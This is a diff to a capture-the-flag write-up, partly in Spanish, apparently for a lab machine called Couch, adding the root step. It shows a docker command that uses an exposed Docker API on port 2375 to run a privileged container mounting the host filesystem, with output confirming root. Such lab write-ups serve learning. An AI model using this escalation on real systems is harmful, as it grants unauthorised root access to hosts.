@@ -102,3 +102,22 @@ This is a simple challenge in which you need to exploit a vulnerable web applica
 docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
 
 ## 9. Escalate privileges and obtain root.txt
+
+- Después de realizar varias consultas y ejecutar linpeas, encontré que con el siguiente comando se puede realizar una montura y luego realizar lectura del archivo **root.txt**:
+
+```cs
+atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
+/ # whoami
+root
+```
+
+![9](/assets/images/thm-writeup-couch/couch_root1.png)
+
+![9](/assets/images/thm-writeup-couch/couch_root2.png)
+
+---
+
+Fuentes:
+
+
+
